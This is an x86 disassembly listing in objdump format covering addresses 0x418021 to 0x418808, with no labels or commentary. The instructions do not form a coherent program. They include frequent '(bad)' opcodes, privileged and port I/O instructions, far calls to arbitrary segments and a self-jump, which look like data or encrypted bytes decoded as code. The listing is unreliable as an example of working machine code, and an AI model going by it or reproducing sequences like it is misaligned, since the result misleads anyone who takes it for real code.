  418021:	mov    al,0x86
  418023:	in     eax,0x97
  418025:	sub    al,0xd6
  418028:	test   DWORD PTR ds:0x8d90fc7e,esi
  41802e:	pop    ebx
  41802f:	ja     0x4180ae
  418031:	call   FWORD PTR [edi]
  418033:	aam    0xec
  418035:	push   edi
  418036:	stc    
  418037:	or     eax,0x84c5332d
  41803c:	dec    ebx
  41803d:	mov    ch,0xe2
  41803f:	adc    eax,0x54d3eb45
  418044:	pushf  
  418045:	(bad)  [eax+0x6]
  418048:	loop   0x417fca
  41804a:	or     eax,0x5c8b2ddf
  41804f:	aas    
  418050:	xchg   esp,eax
  418051:	xchg   esp,eax
  418052:	lahf   
  418053:	mov    ebx,0xca3f578a
  418058:	add    al,0x1c
  41805a:	aaa    
  41805b:	adc    BYTE PTR [esi-0xc],ch
  41805e:	fisubr WORD PTR [ecx+0x5f]
  418061:	push   es
  418062:	fist   DWORD PTR [ecx+0x2b]
  418065:	les    esi,FWORD PTR [esi+0x129a5b4c]
  41806b:	mov    al,ds:0xc9c33103
  418070:	xor    edx,DWORD PTR [eax]
  418072:	inc    ebx
  418073:	mov    bh,0xe7
  418075:	cmp    al,0x9a
  418077:	dec    eax
  418078:	cmp    eax,0x7b019984
  41807d:	aas    
  41807e:	das    
  41807f:	inc    eax
  418080:	push   es
  418081:	aas    
  418082:	jecxz  0x4180cd
  418084:	add    al,0x5d
  418086:	cdq    
  418087:	dec    ecx
  418088:	pop    ebp
  418089:	sti    
  41808a:	push   ecx
  41808b:	int3   
  41808c:	sbb    dl,al
  41808e:	and    al,0x24
  418090:	sub    ebx,edx
  418092:	std    
  418093:	js     0x4180b7
  418095:	call   0x3027:0x22cd34e0
  41809c:	lods   al,BYTE PTR ds:[esi]
  41809d:	popf   
  41809e:	jecxz  0x41806f
  4180a0:	add    eax,0xe76c518c
  4180a5:	sbb    DWORD PTR [esi-0x51],esi
  4180a8:	mov    dh,0x8a
  4180aa:	jmp    0xbd2eb068
  4180af:	rcr    DWORD PTR [edx+0x7733ff8d],1
  4180b5:	adc    al,0x3d
  4180b7:	mov    dl,0x4
  4180b9:	ss pop es
  4180bb:	mov    ah,0x5d
  4180bd:	or     BYTE PTR [esi+0x22],ch
  4180c0:	mov    cl,0x83
  4180c2:	cmc    
  4180c3:	pop    es
  4180c4:	mov    cl,0xf2
  4180c6:	cmp    ah,BYTE PTR [edi-0x9]
  4180c9:	dec    BYTE PTR [ebx]
  4180cb:	popa   
  4180cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180cd:	iret   
  4180ce:	shl    BYTE PTR [ebp-0x1c2144d7],0x53
  4180d5:	(bad)  
  4180d6:	mov    bl,BYTE PTR [edi-0x3a]
  4180d9:	jnp    0x418085
  4180db:	adc    esp,DWORD PTR [eax]
  4180dd:	dec    ebx
  4180de:	push   ebp
  4180df:	repz sbb eax,0xc411b006
  4180e5:	jo     0x41811a
  4180e7:	cmove  eax,DWORD PTR [esi]
  4180ea:	fstp   QWORD PTR [eax]
  4180ec:	aaa    
  4180ed:	sti    
  4180ee:	hlt    
  4180ef:	std    
  4180f0:	mov    al,ds:0xd1119f24
  4180f5:	adc    DWORD PTR [ecx+0x2a68399e],0xffffffd0
  4180fc:	aaa    
  4180fd:	stos   DWORD PTR es:[edi],eax
  4180fe:	popa   
  4180ff:	mov    bh,0x50
  418101:	adc    eax,0xddeba2ec
  418106:	fbstp  TBYTE PTR [ecx-0x48]
  418109:	cmc    
  41810a:	(bad)  
  41810d:	mov    dh,0x41
  41810f:	scas   eax,DWORD PTR es:[edi]
  418110:	xor    DWORD PTR [ebx+0x5a],0x10
  418114:	loop   0x4180c5
  418116:	shl    esp,cl
  418118:	test   al,0xb2
  41811a:	xchg   edx,eax
  41811b:	adc    DWORD PTR ds:0xcf68e9cc,ecx
  418121:	and    BYTE PTR [edi+ebx*8],bh
  418124:	sub    ch,dl
  418126:	outs   dx,DWORD PTR ds:[esi]
  418127:	push   ss
  418128:	repz jmp 0x418128
  41812b:	jge    0x418155
  41812d:	adc    dl,BYTE PTR [ebx-0x2f4b7341]
  418133:	int3   
  418134:	mov    ds:0xa14c2ee2,al
  418139:	ss inc esi
  41813b:	out    0x24,al
  41813d:	out    dx,eax
  41813e:	push   ebp
  41813f:	cdq    
  418140:	aas    
  418141:	dec    ebp
  418142:	ins    BYTE PTR es:[edi],dx
  418143:	loop   0x41819d
  418145:	aaa    
  418146:	mov    eax,0x6c85626f
  41814b:	mov    ch,0x55
  41814d:	icebp  
  41814e:	and    bl,bh
  418150:	push   esp
  418151:	lock es xchg ebp,eax
  418154:	test   al,0x28
  418156:	add    dl,BYTE PTR [edx-0x43a5bf38]
  41815c:	rcr    BYTE PTR [eax-0x72764861],0x56
  418163:	fadd   DWORD PTR ds:[esi]
  418166:	maskmovq mm3,(bad)
  418167:	neg    DWORD PTR [eax*8+0x1f3c5add]
  41816e:	scas   al,BYTE PTR es:[edi]
  41816f:	scas   al,BYTE PTR es:[edi]
  418170:	sbb    al,BYTE PTR [ecx+esi*1+0x40f9f24f]
  418177:	fisubr DWORD PTR [ebx+0x6b]
  41817a:	push   0x1a57c46c
  41817f:	ins    DWORD PTR es:[edi],dx
  418180:	pushf  
  418181:	idiv   DWORD PTR [ebp+0x65]
  418184:	xchg   edx,eax
  418185:	paddusb mm4,QWORD PTR [edx]
  418188:	or     al,0x1d
  41818a:	(bad)  
  41818b:	(bad)  
  41818c:	enter  0x99a1,0x8a
  418190:	lods   eax,DWORD PTR ds:[esi]
  418191:	jae    0x418172
  418193:	mov    ebx,0xf09c38f5
  418198:	pop    esi
  418199:	cld    
  41819a:	outs   dx,BYTE PTR ds:[esi]
  41819b:	pop    esi
  41819c:	cld    
  41819d:	sar    BYTE PTR [edx-0x46],0x6e
  4181a1:	mov    al,ds:0x4c794e1f
  4181a6:	retf   
  4181a7:	jno    0x418182
  4181a9:	inc    edx
  4181aa:	stos   BYTE PTR es:[edi],al
  4181ab:	jo     0x41818f
  4181ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ae:	cdq    
  4181af:	dec    eax
  4181b0:	adc    ecx,DWORD PTR [esi]
  4181b2:	add    bl,BYTE PTR [esi]
  4181b4:	mov    bh,0x13
  4181b6:	popf   
  4181b7:	dec    edx
  4181b8:	dec    ebx
  4181b9:	stos   DWORD PTR es:[edi],eax
  4181ba:	or     DWORD PTR [ebp+0x3f],edx
  4181bd:	ja     0x4181e8
  4181bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c0:	mov    al,ds:0xa7a575c2
  4181c5:	cmp    esp,DWORD PTR [edi]
  4181c7:	data16 int3 
  4181c9:	mov    ch,0xae
  4181cb:	cmp    dh,BYTE PTR ds:0xe49846ff
  4181d1:	push   esi
  4181d2:	shr    DWORD PTR [eax+ebx*2+0x3],cl
  4181d6:	call   0x60e4:0xe555ce71
  4181dd:	ror    cl,0x45
  4181e0:	xchg   ecx,eax
  4181e1:	int3   
  4181e2:	cmc    
  4181e3:	jns    0x41816c
  4181e5:	xchg   ebp,eax
  4181e6:	jnp    0x418181
  4181e8:	iret   
  4181e9:	or     ebp,esp
  4181eb:	pop    ebx
  4181ec:	in     al,dx
  4181ed:	or     dh,0xcc
  4181f0:	lds    edx,FWORD PTR [esi]
  4181f2:	sub    DWORD PTR ss:[eax],esp
  4181f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181f6:	gs cli 
  4181f8:	xor    esp,eax
  4181fa:	cmp    BYTE PTR [esi-0x3057a8f3],ah
  418200:	push   eax
  418201:	in     al,0xf3
  418203:	inc    eax
  418204:	jae    0x418280
  418206:	clc    
  418207:	pop    edi
  418208:	scas   eax,DWORD PTR es:[edi]
  418209:	(bad)  
  41820b:	mov    cl,0xda
  41820d:	(bad)  
  41820e:	in     al,0x6c
  418210:	(bad)  [edx]
  418212:	pop    ds
  418213:	push   0xffffffcb
  418215:	add    esi,DWORD PTR [ebx+eiz*1+0x1a]
  418219:	fimul  DWORD PTR [ebx]
  41821b:	jbe    0x41819f
  41821d:	fmul   QWORD PTR [edx+eiz*4+0x5]
  418221:	xor    edi,DWORD PTR ds:0x88bea55f
  418227:	xchg   ebx,eax
  418228:	jg     0x4181b5
  41822a:	push   ebx
  41822b:	xsavec [edi]
  41822e:	(bad)  
  41822f:	push   ss
  418230:	(bad)  
  418231:	sub    eax,0x38911516
  418236:	sub    dl,dh
  418238:	mov    ds:0x2e91173c,al
  41823d:	push   ss
  41823e:	dec    ecx
  41823f:	push   es
  418240:	or     ebx,0x320958da
  418246:	sbb    eax,0x9908711a
  41824b:	out    0x49,al
  41824d:	cs ret 0xc57b
  418251:	adc    al,0x17
  418253:	push   0x1f
  418255:	(bad)  
  418256:	xchg   esi,eax
  418257:	xchg   ecx,eax
  418258:	test   ebp,0xcecc9986
  41825e:	jae    0x41824b
  418260:	jle    0x41827a
  418262:	loope  0x41820a
  418264:	xlat   BYTE PTR ds:[ebx]
  418265:	xor    esi,edi
  418267:	xchg   ebp,eax
  418268:	fld    TBYTE PTR [eax+0x5a]
  41826b:	mov    al,ds:0xa024d608
  418270:	or     bh,BYTE PTR [edi+edi*8]
  418273:	arpl   WORD PTR [edi+0x73],dx
  418276:	add    edi,DWORD PTR [ebx]
  418278:	call   0xe6d9:0xebfb0926
  41827f:	jae    0x418259
  418281:	lea    ebx,[esp+ebx*1+0x6d]
  418285:	addr16 add dh,al
  418288:	test   DWORD PTR cs:0x534c63,ecx
  41828f:	lahf   
  418290:	push   0xd
  418292:	inc    esp
  418293:	xor    BYTE PTR [edx],cl
  418295:	add    eax,0xfcf4b3b6
  41829a:	retf   0x2e4
  41829d:	xchg   DWORD PTR [eax],esp
  41829f:	add    BYTE PTR [eax-0x6dd8f093],ah
  4182a5:	ins    DWORD PTR es:[edi],dx
  4182a6:	mov    edx,0xe20e44bb
  4182ab:	jl     0x418291
  4182ad:	cmp    DWORD PTR [ecx+esi*2+0x68],0xa60e395
  4182b5:	ss (bad) 
  4182b7:	pop    ebx
  4182b8:	bound  ecx,QWORD PTR [edi+0x46d833a5]
  4182be:	push   0xa0d89cc7
  4182c3:	daa    
  4182c4:	jo     0x418289
  4182c6:	inc    edx
  4182c7:	push   esp
  4182c8:	and    dh,cl
  4182ca:	cmp    BYTE PTR [edi+0x43],al
  4182cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182ce:	loope  0x41831c
  4182d0:	out    0xc9,eax
  4182d2:	pushf  
  4182d3:	icebp  
  4182d4:	mov    ebp,0xfd132df8
  4182d9:	into   
  4182da:	and    BYTE PTR [esi+esi*4+0x3a],ch
  4182de:	add    ecx,DWORD PTR [ebp-0x2ba579aa]
  4182e4:	mov    dh,0x71
  4182e6:	fisttp QWORD PTR [eax]
  4182e8:	and    al,0x8e
  4182ea:	ror    DWORD PTR [ebx+ebp*4-0x68f14a6],0x8a
  4182f2:	aam    0x6e
  4182f4:	fnsave [edx-0x16]
  4182f7:	xor    DWORD PTR [edx+0x70],esi
  4182fa:	push   0x56140eb4
  4182ff:	dec    edi
  418300:	sub    DWORD PTR [eax],edx
  418302:	test   eax,0x89c4fccd
  418307:	stos   DWORD PTR es:[edi],eax
  418308:	imul   edx,DWORD PTR [edi-0x2a30542],0x20
  41830f:	sub    DWORD PTR [edi-0x737ffe04],ecx
  418315:	push   edi
  418316:	push   eax
  418317:	add    esi,DWORD PTR [ebp+0x6]
  41831a:	inc    edx
  41831b:	add    DWORD PTR [ecx-0x3205752a],edx
  418321:	mov    ebx,0x9aa6c0ca
  418326:	out    dx,eax
  418327:	push   eax
  418328:	mov    cl,0x8b
  41832a:	lahf   
  41832b:	inc    ebx
  41832c:	pushf  
  41832d:	dec    edi
  41832e:	or     edx,ecx
  418330:	or     dl,BYTE PTR [ecx+0x1cac48c3]
  418336:	fld    QWORD PTR [edi+edi*2]
  418339:	xchg   ebp,eax
  41833a:	or     BYTE PTR [edi],0x89
  41833d:	mov    edi,0x2733b2a4
  418342:	pop    es
  418343:	xor    al,0xf2
  418345:	mov    ecx,0x4f4779c8
  41834a:	adc    DWORD PTR [edx],ebx
  41834c:	(bad)  
  41834d:	mov    eax,ds:0xde9f09cd
  418352:	adc    dh,0x7c
  418355:	mov    al,0x19
  418357:	push   ds
  418358:	jge    0x418309
  41835a:	loopne 0x4183a9
  41835c:	fnsave [ecx]
  41835e:	inc    ebx
  41835f:	xchg   ecx,eax
  418360:	sbb    eax,DWORD PTR [edx]
  418362:	dec    edi
  418363:	bound  esi,QWORD PTR [eax-0x1ab2f232]
  418369:	mov    ?,ebp
  41836b:	jmp    0xcff0a68
  418370:	stos   BYTE PTR es:[edi],al
  418371:	lock outs dx,BYTE PTR ds:[esi]
  418373:	cmp    dh,BYTE PTR [esi-0x5873ab76]
  418379:	xchg   ebp,eax
  41837a:	sub    al,0xe7
  41837c:	pop    edi
  41837d:	dec    ebp
  41837e:	xchg   DWORD PTR [ebx+0x2b8a1dd8],ebx
  418384:	jle    0x4183a7
  418386:	inc    ecx
  418387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418388:	and    DWORD PTR [esi],ebp
  41838a:	jns    0x4183d6
  41838c:	sbb    eax,ebp
  41838e:	imul   DWORD PTR [esi]
  418390:	ds jmp 0x11a7:0x26705d3e
  418398:	mov    bh,0xc4
  41839a:	dec    ebx
  41839b:	mov    edi,0x1cdf98b7
  4183a0:	push   edi
  4183a1:	pop    eax
  4183a2:	ins    DWORD PTR es:[edi],dx
  4183a3:	sub    eax,DWORD PTR [ebp-0x31]
  4183a6:	inc    edi
  4183a7:	scas   eax,DWORD PTR es:[edi]
  4183a8:	and    DWORD PTR [ebx-0x5bb92ac5],esi
  4183ae:	repz iret 
  4183b0:	mov    ds:0xb3d479be,al
  4183b5:	lds    edi,FWORD PTR [esp+edx*4]
  4183b8:	xchg   edx,eax
  4183b9:	ja     0x41833f
  4183bb:	mov    ebx,0x37
  4183c0:	add    BYTE PTR [eax],al
  4183c2:	xchg   esi,eax
  4183c3:	cmp    eax,0xffebb562
  4183c8:	xlat   BYTE PTR ds:[ebx]
  4183c9:	aas    
  4183ca:	popa   
  4183cb:	adc    ch,cl
  4183cd:	and    DWORD PTR [ebp+0x76],0xffffffe9
  4183d1:	ds add al,0x1
  4183d4:	add    DWORD PTR [eax],eax
  4183d6:	repz add al,0x0
  4183d9:	add    BYTE PTR [ebx+0x55f3599d],cl
  4183df:	int3   
  4183e0:	mov    esp,edi
  4183e2:	fdivr  st(0),st
  4183e4:	inc    esp
  4183e5:	pop    edx
  4183e6:	push   ecx
  4183e7:	inc    edi
  4183e8:	jae    0x418394
  4183ea:	out    0xd2,al
  4183ec:	jl     0x4183b2
  4183ee:	mov    al,ds:0x7279c24f
  4183f3:	daa    
  4183f4:	mov    esp,0x9b6f315d
  4183f9:	stos   DWORD PTR es:[edi],eax
  4183fa:	shl    BYTE PTR [esi-0x65b8410f],0xd6
  418401:	dec    esi
  418402:	fwait
  418403:	call   0x4474:0xb19af043
  41840a:	ins    DWORD PTR es:[edi],dx
  41840b:	pop    ebx
  41840c:	dec    eax
  41840d:	das    
  41840e:	lea    esi,[ebp+0x3]
  418411:	fwait
  418412:	and    ah,BYTE PTR [ecx]
  418414:	cmp    edx,DWORD PTR [ecx]
  418416:	mov    BYTE PTR [ebx+ebx*1],dl
  418419:	rol    BYTE PTR [edx],0x75
  41841c:	mul    DWORD PTR [edx+0x47]
  41841f:	mov    ebx,0xfa4b12dd
  418424:	jp     0x41846a
  418426:	in     al,0x2f
  418428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418429:	pop    es
  41842a:	fld    TBYTE PTR [esi]
  41842c:	pop    es
  41842d:	cwde   
  41842e:	rcl    BYTE PTR [edi+eiz*4+0x2763a2fa],0x8f
  418436:	cld    
  418437:	ins    BYTE PTR es:[edi],dx
  418438:	add    eax,0x13d59b43
  41843d:	xchg   esp,eax
  41843e:	std    
  41843f:	es inc edx
  418441:	adc    esi,DWORD PTR [ebx]
  418443:	popa   
  418444:	int    0x5b
  418446:	inc    ebp
  418447:	dec    ebp
  418448:	out    dx,al
  418449:	lock mov ebx,0xb062f667
  41844f:	or     dl,BYTE PTR [ecx-0x6f7f74ac]
  418455:	arpl   WORD PTR [ecx*8-0x5bce236c],si
  41845c:	sub    eax,0xefffe009
  418461:	(bad)  
  418462:	rol    BYTE PTR [edi+0x6bfc7c2e],0x6a
  418469:	(bad)  
  41846a:	xor    BYTE PTR [edi],bh
  41846c:	inc    ebp
  41846d:	std    
  41846e:	pop    ss
  41846f:	xchg   BYTE PTR [ebp-0x42],al
  418472:	mov    ch,0xe7
  418474:	mov    ch,0xf
  418476:	neg    cl
  418478:	in     eax,0x60
  41847a:	and    eax,0x42678bd7
  41847f:	jmp    0x4184c4
  418481:	xor    edi,ecx
  418483:	jl     0x418456
  418485:	add    eax,0x13a4d390
  41848a:	xchg   ebx,eax
  41848b:	js     0x41847c
  41848d:	adc    eax,0xf409e73b
  418492:	adc    dl,dl
  418494:	pop    ebx
  418495:	adc    dh,BYTE PTR [esi-0x680c5ae5]
  41849b:	nop
  41849c:	sub    DWORD PTR [esi-0x30],edx
  41849f:	add    al,0xf8
  4184a1:	jecxz  0x4184df
  4184a3:	shl    esi,1
  4184a5:	(bad)  
  4184a6:	mov    esi,0x95253b03
  4184ab:	sbb    DWORD PTR [eax*1+0x12bfe4c2],edx
  4184b2:	ret    0xd7e4
  4184b5:	ins    BYTE PTR es:[edi],dx
  4184b6:	push   ecx
  4184b7:	cs clc 
  4184b9:	and    ebp,esi
  4184bb:	daa    
  4184bc:	popf   
  4184bd:	pop    ss
  4184be:	push   0xd81c19ef
  4184c3:	push   es
  4184c4:	call   0xe3662545
  4184c9:	sub    al,0x81
  4184cb:	xor    eax,0x485c5cb3
  4184d0:	adc    al,0xbf
  4184d2:	aam    0x33
  4184d4:	int    0xa5
  4184d6:	retf   
  4184d7:	std    
  4184d8:	pop    edx
  4184d9:	jo     0x418557
  4184db:	fidiv  WORD PTR [ebx+esi*4-0x740d1e5f]
  4184e2:	fsincos 
  4184e4:	data16 fcomip st,st(7)
  4184e7:	mov    edi,0x255c5c64
  4184ec:	ja     0x4184cf
  4184ee:	mov    ?,WORD PTR [edi]
  4184f0:	mov    eax,0x23d36c4f
  4184f5:	fcmovu st,st(7)
  4184f7:	je     0x4184d0
  4184f9:	out    0x2a,eax
  4184fb:	or     BYTE PTR [ebx],dh
  4184fd:	out    dx,al
  4184fe:	and    edx,ecx
  418500:	xchg   ebp,eax
  418501:	repnz pop ebx
  418503:	ret    0x9245
  418506:	inc    esp
  418507:	fdiv   DWORD PTR ds:0xb3d4cb45
  41850d:	test   edi,edx
  41850f:	mov    cl,0xce
  418511:	cld    
  418512:	mov    dh,0x28
  418514:	ja     0x4184ee
  418516:	iret   
  418517:	sti    
  418518:	xchg   bl,dh
  41851a:	xor    DWORD PTR [ebp+0x3e2a0616],0x4a
  418521:	mov    ds:0x73479f1f,eax
  418526:	add    DWORD PTR [ecx+0x17],ebp
  418529:	call   0xb7ee:0x613b94fa
  418530:	and    BYTE PTR [ecx-0x64085696],bh
  418536:	xchg   esi,eax
  418537:	cwde   
  418538:	mov    ds:0x6dcf7472,al
  41853d:	pop    esp
  41853e:	sub    edx,DWORD PTR [edi+0x45]
  418541:	mov    edi,DWORD PTR [edi+0x7e]
  418544:	jl     0x4184f5
  418546:	fdivr  st(3),st
  418548:	jno    0x4184e4
  41854a:	pop    esp
  41854b:	jns    0x4184e8
  41854d:	pop    ss
  41854e:	loopne 0x418566
  418550:	sbb    eax,0xfdb0eeb2
  418555:	sub    DWORD PTR fs:[ebx+0x53],0x7a87e3b1
  41855d:	mov    esi,0x5dec7c1e
  418562:	aas    
  418563:	lea    edi,[esi+0x41]
  418566:	jmp    0x418533
  418568:	push   ecx
  418569:	xor    BYTE PTR [ecx],al
  41856b:	jns    0x41855c
  41856d:	jo     0x4184f7
  41856f:	pop    edi
  418570:	loope  0x4185eb
  418572:	push   0x2ede6dc2
  418577:	daa    
  418578:	push   edi
  418579:	pop    eax
  41857a:	sbb    al,0x24
  41857c:	inc    ecx
  41857d:	jnp    0x4185ac
  41857f:	mov    ebx,esp
  418581:	lods   eax,DWORD PTR ds:[esi]
  418582:	push   esi
  418583:	mov    WORD PTR [ebx-0x51],fs
  418586:	popa   
  418587:	js     0x4185a8
  418589:	cmp    ebp,ebp
  41858b:	xchg   esp,eax
  41858c:	push   esp
  41858d:	xor    eax,ebp
  41858f:	aam    0xa4
  418591:	dec    eax
  418592:	out    dx,eax
  418593:	xor    ah,BYTE PTR [ebx-0x246b0755]
  418599:	mov    ecx,0xd5304693
  41859e:	xchg   esp,eax
  41859f:	fisub  DWORD PTR [edx]
  4185a1:	inc    edi
  4185a2:	mov    ecx,edx
  4185a4:	jmp    0x4185f8
  4185a6:	stc    
  4185a7:	mov    cl,0x86
  4185a9:	add    ecx,DWORD PTR [esp+edi*8]
  4185ac:	inc    ebp
  4185ad:	xchg   ebx,eax
  4185ae:	(bad)  [esi]
  4185b0:	sub    DWORD PTR [ebp-0xcaf596e],edi
  4185b6:	das    
  4185b7:	xchg   edi,eax
  4185b8:	test   al,0x59
  4185ba:	cmp    eax,0xc933d12c
  4185bf:	xor    dl,BYTE PTR ds:0xa81b9ea6
  4185c5:	out    dx,al
  4185c6:	push   ebp
  4185c7:	push   esp
  4185c8:	ss mov ebx,0x9d001bbb
  4185ce:	add    al,0xd7
  4185d0:	jb     0x4185b8
  4185d2:	push   ds
  4185d3:	dec    edi
  4185d4:	(bad)  
  4185d5:	pop    edx
  4185d6:	out    dx,al
  4185d7:	loop   0x41855f
  4185d9:	jle    0x418658
  4185db:	sub    eax,0x924f799f
  4185e0:	inc    esi
  4185e1:	(bad)  
  4185e2:	aaa    
  4185e3:	inc    esi
  4185e4:	add    DWORD PTR [eax],0x6e
  4185e7:	aad    0x7c
  4185e9:	and    DWORD PTR [edi+edi*1-0x31],0xd385bcc5
  4185f1:	sbb    BYTE PTR [ebp+0x1c],ah
  4185f4:	and    bh,ch
  4185f6:	xchg   ecx,eax
  4185f7:	dec    esi
  4185f8:	xchg   esi,eax
  4185f9:	or     dl,BYTE PTR [edi]
  4185fb:	test   BYTE PTR [ebp+ecx*8-0x5497494d],dl
  418602:	shl    ch,cl
  418604:	add    edx,DWORD PTR ds:0xa5716767
  41860a:	scas   al,BYTE PTR es:[edi]
  41860b:	xchg   ebx,eax
  41860c:	xchg   esp,eax
  41860d:	inc    edi
  41860e:	or     eax,0x32c9b8bc
  418613:	retf   0x4833
  418616:	lods   eax,DWORD PTR ds:[esi]
  418617:	jo     0x418641
  418619:	icebp  
  41861a:	dec    esp
  41861b:	std    
  41861c:	or     eax,0xa3727531
  418621:	test   BYTE PTR [ebx],cl
  418623:	jnp    0x418627
  418625:	inc    ecx
  418626:	push   0x9df422d2
  41862b:	sub    dh,dl
  41862d:	sbb    cl,ch
  41862f:	add    edi,ebx
  418631:	xchg   edx,eax
  418632:	jb     0x41864e
  418634:	inc    ebp
  418635:	lea    ebp,[ecx+0x6ac9f10]
  41863b:	mov    bl,0xbb
  41863d:	in     eax,0x38
  41863f:	fistp  WORD PTR [eax+ebx*4-0x2816fca1]
  418646:	sbb    BYTE PTR [ecx+0x3f],al
  418649:	adc    ebp,0x4afc80ae
  41864f:	xor    al,0xe8
  418651:	xchg   BYTE PTR [edx+0x38],dl
  418654:	xor    cl,BYTE PTR [edi+0x74]
  418657:	xchg   esi,eax
  418658:	test   eax,0xab70209f
  41865d:	ins    BYTE PTR es:[edi],dx
  41865e:	jmp    0x5ec1:0x55f8a955
  418665:	rol    dl,0x34
  418668:	sub    DWORD PTR [eax+0x18e142e1],esi
  41866e:	xchg   ebp,eax
  41866f:	aad    0xcb
  418671:	mov    eax,ds:0x6bea7bad
  418676:	fmul   DWORD PTR [edx-0x3888b41e]
  41867c:	aaa    
  41867d:	jb     0x41868a
  41867f:	mov    bh,0x98
  418681:	js     0x4186d6
  418683:	sub    DWORD PTR ds:0x6ebc33a8,esi
  418689:	push   eax
  41868a:	pop    ebx
  41868b:	dec    esp
  41868c:	cmp    DWORD PTR [edi],ecx
  41868e:	das    
  41868f:	sub    eax,ebx
  418691:	inc    edx
  418692:	call   0x51a7be42
  418697:	fmul   QWORD PTR [edi+0x1b]
  41869a:	popa   
  41869b:	and    eax,DWORD PTR [edx+0x55]
  41869e:	add    eax,0x4dcbdb75
  4186a3:	jb     0x4186f7
  4186a5:	pop    ecx
  4186a6:	enter  0x3240,0xea
  4186aa:	sub    eax,0x4bb14876
  4186af:	sti    
  4186b0:	inc    ebx
  4186b1:	stos   DWORD PTR es:[edi],eax
  4186b2:	aaa    
  4186b3:	je     0x4186af
  4186b5:	xchg   BYTE PTR [eax+0x60490733],bl
  4186bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186bc:	stos   BYTE PTR es:[edi],al
  4186bd:	push   ebx
  4186be:	push   ss
  4186bf:	cmc    
  4186c0:	push   DWORD PTR [ecx-0x309d634d]
  4186c6:	pop    esp
  4186c7:	imul   edi,DWORD PTR [ecx-0x37],0x31fa2221
  4186ce:	enter  0x1ef0,0x14
  4186d2:	or     ebp,edi
  4186d4:	or     ah,BYTE PTR [eax]
  4186d6:	aad    0x57
  4186d8:	xchg   ebx,eax
  4186d9:	adc    eax,0x2da5bdc4
  4186de:	push   esi
  4186df:	test   DWORD PTR [eax+0x6f],edx
  4186e2:	jbe    0x41870a
  4186e4:	not    BYTE PTR [ebp-0x55ba9154]
  4186ea:	xor    eax,DWORD PTR [ebp+0x353393be]
  4186f0:	cli    
  4186f1:	sbb    DWORD PTR [ebx],edx
  4186f3:	adc    cl,BYTE PTR [ebx+0x65d6a11d]
  4186f9:	mov    ebx,0x692e1621
  4186fe:	arpl   WORD PTR [edi-0x15dd59cb],sp
  418704:	adc    eax,0xf7749058
  418709:	arpl   bp,dx
  41870b:	out    0x67,al
  41870d:	dec    esi
  41870e:	test   DWORD PTR [edx-0xb06eb74],ecx
  418714:	loop   0x4186f6
  418716:	mov    eax,ds:0xdfdf2609
  41871b:	cmc    
  41871c:	pop    ebx
  41871d:	lahf   
  41871e:	xchg   ebx,eax
  41871f:	ret    
  418720:	mov    ds:0xc1dfb347,al
  418725:	scas   eax,DWORD PTR es:[edi]
  418726:	sti    
  418727:	popa   
  418728:	repnz cmc 
  41872a:	in     eax,0x9f
  41872c:	cmp    ah,bl
  41872e:	push   esi
  41872f:	add    cl,bl
  418731:	gs jnp 0x4187a4
  418734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418735:	xchg   ecx,eax
  418736:	inc    esp
  418737:	outs   dx,DWORD PTR ds:[esi]
  418738:	loope  0x418762
  41873a:	mov    ebp,0x8c08c49b
  41873f:	pop    esi
  418740:	sbb    BYTE PTR [ecx],al
  418742:	outs   dx,BYTE PTR ds:[esi]
  418743:	dec    BYTE PTR [edi-0x31d57e3b]
  418749:	sbb    BYTE PTR [ecx],dh
  41874b:	test   eax,0x71246650
  418750:	pop    es
  418751:	add    BYTE PTR [edi-0x55],cl
  418754:	add    DWORD PTR [ebp-0x62],0x50bf63cc
  41875b:	jl     0x41871f
  41875d:	addr16 loope 0x41871f
  418760:	lods   al,BYTE PTR ds:[esi]
  418761:	sbb    BYTE PTR [eax-0x67],al
  418764:	sub    ebp,edi
  418766:	aas    
  418767:	pop    eax
  418768:	cmp    ebx,esi
  41876a:	pop    esi
  41876b:	rol    BYTE PTR [ebx+0x66],cl
  41876e:	aaa    
  41876f:	push   edi
  418770:	out    dx,eax
  418771:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418773:	ror    BYTE PTR [esi],cl
  418775:	sub    bh,BYTE PTR ds:0xf7516e9c
  41877b:	sub    esp,esp
  41877d:	lods   eax,DWORD PTR ds:[esi]
  41877e:	sbb    ebp,DWORD PTR [ecx+0x7b]
  418781:	imul   esp,DWORD PTR [ecx-0x12626434],0x8398cc2d
  41878b:	jo     0x4187e8
  41878d:	push   ebx
  41878e:	repz cmp DWORD PTR [ecx],0x9898ca88
  418795:	bound  ecx,QWORD PTR [edi-0x6cc5acb8]
  41879b:	fild   WORD PTR [eax*2+0x6a41f80f]
  4187a2:	mov    eax,0x5ec0c454
  4187a7:	sbb    ecx,eax
  4187a9:	ret    0x5c4f
  4187ac:	inc    ebx
  4187ad:	and    al,0x90
  4187af:	test   eax,0x53a94ee3
  4187b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b5:	cmp    ecx,0xffffffa9
  4187b8:	sub    BYTE PTR [esi-0x1fc7e8d5],ah
  4187be:	mov    eax,ds:0xf23ba677
  4187c3:	sbb    al,0x67
  4187c5:	sbb    al,0xa8
  4187c7:	imul   ebx,DWORD PTR [ebx-0x2e7ea932],0xffffffd1
  4187ce:	inc    edx
  4187cf:	shr    BYTE PTR [ebp+edi*4+0x66646496],0x95
  4187d7:	cmp    bl,BYTE PTR [ecx-0x1e483be9]
  4187dd:	aad    0xb8
  4187df:	jo     0x4187ff
  4187e1:	arpl   WORD PTR [edi+0x3d],bp
  4187e4:	cdq    
  4187e5:	jno    0x4187d7
  4187e7:	(bad)  
  4187e8:	sbb    al,0x77
  4187ea:	popa   
  4187eb:	jo     0x41877d
  4187ed:	or     al,0xc
  4187ef:	cmp    eax,0xa121716
  4187f4:	aad    0x65
  4187f6:	mov    esi,0x53923600
  4187fb:	repnz dec ecx
  4187fd:	imul   ecx,DWORD PTR [eax-0x4a],0x4ead7942
  418804:	jge    0x41880c
  418806:	hlt    
  418807:	dec    edx
  418808:	sbb    eax,0x75c91a09
